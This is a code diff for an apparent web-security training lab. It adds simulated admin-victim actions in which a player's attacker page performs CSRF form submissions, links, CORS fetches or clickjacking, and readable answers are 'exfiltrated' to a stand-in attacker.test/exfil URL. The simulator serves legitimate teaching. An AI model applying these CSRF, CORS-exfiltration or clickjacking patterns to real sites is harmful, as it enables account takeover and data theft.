@@ -12,11 +12,12 @@ import type { Text } from './registry.js'; // type only: the registry imports th
 import { sendPage } from './render.js';
 import {
   ATTACKER_PAGE_URL, REDIRECT_STATUSES, isThenable, type SimAttackerPage, type SimBrowser, type SimClick, type SimClickOptions,
-  type SimCrossSiteOptions, type SimCrossSitePostOptions, type SimFetch, type SimFetchOptions, type SimFrame, type SimFrameOptions,
+  type SimCrossSiteOptions, type SimCrossSitePostOptions, type SimFetch, type SimFetchOptions, type SimFetchVerdict, type SimFrame,
+  type SimFrameOptions,
   type SimHandler, type SimNavigateOptions, type SimOutcome, type SimRequest, type SimResponse, type SimVisit,
 } from './sim/browser.js';
 import type { SimCookieJar } from './sim/cookies.js';
-import { framingOf, type SimFormFields } from './sim/cross.js';
+import { formEntries, framingOf, type SimFormFields } from './sim/cross.js';
 import { SIM_LIMITS, clip, str } from './sim/limits.js';
 import { ATTACKER_ORIGIN, CITADEL_ORIGIN, classifySimUrl, labHref, type SimUnreachable, type SimUrl } from './sim/url.js';
 import { PLAYER_MAILBOX, World, type SimWorld } from './sim/world.js';
@@ -66,6 +67,12 @@ export const VICTIM_LABELS = Object.freeze({
   checkMail: textOf('sim.action.check_mail'),
   /** "Send link to the admin" (use with input: 'url') */
   sendLink: textOf('sim.action.send_link'),
+  /** "Ask the admin to open your page" (visitAttackerPageAction) */
+  visitPage: textOf('sim.action.visit_page'),
+  /** "Send the admin a link to your page" (sendAttackerPageAction) */
+  sendPage: textOf('sim.action.send_page'),
+  /** "Ask the admin to open your framing page" (frameAndClickAction) */
+  frameAndClick: textOf('sim.action.frame_click'),
 });
 
 /** A preset's re-arm step (see VictimPresetOptions.rearm). */
@@ -151,6 +158,217 @@ export function sendLinkAction(browser: (req: Request) => SimBrowser, opts: Vict
       const b = browser(req);
       rearm(req, b);
       b.follow(url);
+    },
+  });
+}
+
+// ---------------------------------------------------------------------------------------------------------------
+// Across sites (engine task E1): the admin opens the player's attacker page, which submits a form, follows a link,
+// calls fetch() or frames a citadel page. The page is the player's input, declared by the lab (never parsed from
+// HTML, never run): what it does is one AttackerStep, and the browser rules (core/sim/cross.ts, the SameSite jar)
+// decide what reaches the citadel and what comes back.
+
+/** Where a page that read a cross-origin answer sends it: `POST <ATTACKER_EXFIL_URL>`, the answer as the body. */
+export const ATTACKER_EXFIL_URL = `${ATTACKER_ORIGIN}/exfil`;
+
+/** The one thing the player's attacker page does when the admin opens it. */
+export type AttackerStep =
+  /**
+   * An auto-submitting `<form action method enctype>` of hidden fields: a top-level navigation (CSRF). POST (the
+   * default) runs crossSitePost; GET puts the fields in the action's query and runs crossSiteLink.
+   */
+  | { readonly kind: 'form'; readonly action: string; readonly method?: 'GET' | 'POST'; readonly enctype?: string; readonly fields: SimFormFields }
+  /** `location = url`, or a link the admin clicks: a top-level GET navigation (crossSiteLink). */
+  | { readonly kind: 'link'; readonly url: string }
+  /**
+   * `fetch(url, init)` (corsFetch). When the browser lets the page read the answer, the page sends it home:
+   * `POST ATTACKER_EXFIL_URL` with the answer as its body lands in the player's attacker log (FP-03's proof).
+   */
+  | ({ readonly kind: 'fetch'; readonly url: string } & Omit<SimFetchOptions, 'page'>);
+
+/** The player's attacker page as the lab stores it: where it is (its URL, policy, sandbox) and what it does. */
+export interface AttackerScript {
+  /** Default: http://attacker.test/ with Chrome's default policy. sendAttackerPageAction puts it at the link sent. */
+  readonly page?: SimAttackerPage;
+  readonly does: AttackerStep;
+}
+
+/** What visitAttackerPageAction and sendAttackerPageAction take besides the usual preset options. */
+export interface AttackerPageOptions extends VictimPresetOptions {
+  /** The victim's browser for this request, e.g. `(req) => labFor(req).admin`. */
+  readonly browser: (req: Request) => SimBrowser;
+  /** The player's attacker page for this request, as the lab keeps it in its per-session state; undefined: none yet. */
+  readonly page: (req: Request) => AttackerScript | undefined;
+}
+
+/** The page shown in the player's frame, as frameAndClickAction's `click` sees it (SimFrame.page). */
+export type FramedPage = NonNullable<SimFrame['page']>;
+
+/** The form a framed page's button submits (the lab's own page knows its forms; the sim reads no HTML). */
+export interface FramedForm {
+  /** The form's action, absolute or relative to the framed page. */
+  readonly action: string;
+  readonly fields: SimFormFields;
+  /** The form's enctype (default urlencoded). */
+  readonly enctype?: string;
+}
+
+/** frameAndClickAction()'s options. */
+export interface FrameAndClickOptions extends VictimPresetOptions {
+  readonly browser: (req: Request) => SimBrowser;
+  /**
+   * What the admin's click submits on the page your frame shows, under your decoy: that page's form (the lab says
+   * which, from the page's URL and its own state), or undefined when the page has no such button.
+   */
+  readonly click: (req: Request, framed: FramedPage) => FramedForm | undefined;
+  /** The framing page (default http://attacker.test/), e.g. a lab field for its URL. */
+  readonly page?: (req: Request) => Omit<SimAttackerPage, 'sandboxed'> | undefined;
+}
+
+const STEP_KINDS: ReadonlySet<string> = new Set(['form', 'link', 'fetch']);
+
+/** A lab's AttackerScript, checked: a programming error throws (the player's strings are data, never checked here). */
+function checkScript(s: unknown): AttackerScript {
+  const does = (s as AttackerScript | null)?.does as Partial<Record<string, unknown>> | undefined;
+  if (s === null || typeof s !== 'object' || does === null || typeof does !== 'object' || !STEP_KINDS.has(String(does.kind))) {
+    throw new Error("attacker page: page(req) must return { page?, does: { kind: 'form' | 'link' | 'fetch', ... } } or undefined");
+  }
+  const url = does.kind === 'form' ? does.action : does.url;
+  if (typeof url !== 'string') throw new Error(`attacker page: a ${String(does.kind)} step needs a string ${does.kind === 'form' ? 'action' : 'url'}`);
+  return s as AttackerScript;
+}
+
+/** A GET form's URL: the action with its query replaced by the fields (HTML), or the action as given when it does not parse. */
+function getFormUrl(action: string, fields: SimFormFields, base: string): string {
+  try {
+    const u = new URL(action, base);
+    u.search = new URLSearchParams(formEntries(fields)).toString();
+    return u.href;
+  } catch {
+    return action;
+  }
+}
+
+/** The note for a fetch the page made: what its devtools console would say. */
+const FETCH_NOTES: Readonly<Record<SimFetchVerdict, string>> = Object.freeze({
+  readable: 'sim.note.fetch_read', preflight: 'sim.note.fetch_preflight', invalid: 'sim.note.fetch_invalid',
+  'no-answer': 'sim.note.fetch_no_answer', 'no-allow-origin': 'sim.note.cors_no_allow_origin',
+  'origin-mismatch': 'sim.note.cors_origin_mismatch', 'wildcard-credentials': 'sim.note.cors_wildcard_credentials',
+  'no-allow-credentials': 'sim.note.cors_no_allow_credentials',
+});
+
+/**
+ * The admin opens the attacker page at `page` (your server logs that GET, as for any link), then the page does its
+ * one step. A fetch the browser lets the page read is sent home (ATTACKER_EXFIL_URL). Returns the note for the panel.
+ */
+function runAttackerPage(b: SimBrowser, script: AttackerScript, page: SimAttackerPage): Text | void {
+  const at = classifySimUrl(str(page.url ?? ATTACKER_PAGE_URL));
+  if (at.site !== 'attacker') return textOf('sim.note.not_your_server');
+  b.follow(at.url);
+  const { does } = script;
+  const opts = { page };
+  if (does.kind === 'link') { b.crossSiteLink(does.url, opts); return; }
+  if (does.kind === 'form') {
+    if (does.method === 'GET') b.crossSiteLink(getFormUrl(does.action, does.fields, at.url), opts);
+    else b.crossSitePost(does.action, does.fields, { ...opts, ...(does.enctype === undefined ? {} : { contentType: does.enctype }) });
+    return;
+  }
+  const { kind: _kind, url, ...init } = does;
+  const f = b.corsFetch(url, { ...init, page });
+  if (f.verdict === 'readable') b.world.attackerLog.record({ method: 'POST', url: ATTACKER_EXFIL_URL, body: f.body ?? '' });
+  return textOf(FETCH_NOTES[f.verdict]);
+}
+
+function checkFunction(what: string, name: string, fn: unknown): void {
+  if (typeof fn !== 'function') throw new Error(`${what}: ${name} must be a function`);
+}
+
+/**
+ * "Ask the admin to open your page": the admin, signed in to the citadel, opens the player's attacker page (where
+ * `page(req)` says it is, default http://attacker.test/), and the page does its step: an auto-submitted form or a
+ * link (CSRF: FP-01, FP-02), or a fetch whose readable answer it sends home (CORS: FP-03). A bilingual note says
+ * when there is no page yet, and what the browser said about a fetch.
+ */
+export function visitAttackerPageAction(opts: AttackerPageOptions): VictimAction {
+  const { browser, page, rearm } = opts;
+  checkPreset('visitAttackerPageAction', browser, opts);
+  checkFunction('visitAttackerPageAction', 'page', page);
+  return Object.freeze({
+    name: opts.name ?? 'visit-attacker-page',
+    label: opts.label ?? VICTIM_LABELS.visitPage,
+    description: opts.description ?? textOf('sim.describe.visit_page'),
+    run: (req: Request): Text | void => {
+      const b = browser(req);
+      rearm(req, b);
+      const raw: unknown = page(req);
+      if (raw === undefined) return textOf('sim.note.no_page');
+      const script = checkScript(raw);
+      return runAttackerPage(b, script, script.page ?? {});
+    },
+  });
+}
+
+/**
+ * "Send the admin a link to your page": as visitAttackerPageAction, but the page is at the link the player sends (its
+ * origin and path are the player's choice: `http://citadel.test.attacker.test/`, `http://attacker.test/citadel?x`).
+ * A link off attacker.test is not opened (a note says so): this preset never sends the admin anywhere else.
+ */
+export function sendAttackerPageAction(opts: AttackerPageOptions): VictimAction {
+  const { browser, page, rearm } = opts;
+  checkPreset('sendAttackerPageAction', browser, opts);
+  checkFunction('sendAttackerPageAction', 'page', page);
+  return Object.freeze({
+    name: opts.name ?? 'send-attacker-page',
+    label: opts.label ?? VICTIM_LABELS.sendPage,
+    description: opts.description ?? textOf('sim.describe.send_page'),
+    input: 'url',
+    run: (req: Request, { url }: { readonly url: string }): Text | void => {
+      const b = browser(req);
+      rearm(req, b);
+      if (classifySimUrl(url).site !== 'attacker') return textOf('sim.note.not_your_server');
+      const raw: unknown = page(req);
+      if (raw === undefined) return textOf('sim.note.no_page');
+      const script = checkScript(raw);
+      return runAttackerPage(b, script, { ...script.page, url });
+    },
+  });
+}
+
+/**
+ * "Ask the admin to open your framing page" (clickjacking, FP-04): the admin opens your page, which frames the
+ * citadel link you send; if the browser shows it there (no X-Frame-Options or frame-ancestors refusal), the admin
+ * clicks your decoy, which lies over the framed page's button: `click(req, framed)` names that page's form, and it is
+ * submitted inside the frame (clickThrough). Notes say why the frame stayed empty or the click did nothing.
+ */
+export function frameAndClickAction(opts: FrameAndClickOptions): VictimAction {
+  const { browser, click, rearm } = opts;
+  checkPreset('frameAndClickAction', browser, opts);
+  checkFunction('frameAndClickAction', 'click', click);
+  if (opts.page !== undefined) checkFunction('frameAndClickAction', 'page', opts.page);
+  return Object.freeze({
+    name: opts.name ?? 'frame-and-click',
+    label: opts.label ?? VICTIM_LABELS.frameAndClick,
+    description: opts.description ?? textOf('sim.describe.frame_click'),
+    input: 'url',
+    run: (req: Request, { url }: { readonly url: string }): Text | void => {
+      const b = browser(req);
+      rearm(req, b);
+      const page = opts.page?.(req) ?? {};
+      const at = classifySimUrl(str(page.url ?? ATTACKER_PAGE_URL));
+      if (at.site !== 'attacker') return textOf('sim.note.not_your_server');
+      b.follow(at.url);
+      const frame = b.frame(url, { page });
+      if (!frame.framed || frame.page === undefined) {
+        return textOf(frame.reason === 'x-frame-options' ? 'sim.note.frame_x_frame_options'
+          : frame.reason === 'frame-ancestors' ? 'sim.note.frame_frame_ancestors' : 'sim.note.frame_not_loaded');
+      }
+      const target: unknown = click(req, frame.page);
+      if (target === undefined) return textOf('sim.note.nothing_to_click');
+      const t = target as Partial<FramedForm> | null;
+      if (t === null || typeof t !== 'object' || typeof t.action !== 'string' || t.fields === null || typeof t.fields !== 'object') {
+        throw new Error('frameAndClickAction: click(req, framed) must return { action, fields, enctype? } or undefined');
+      }
+      b.clickThrough(frame, t.action, t.fields, t.enctype === undefined ? {} : { contentType: t.enctype });
     },
   });
 }
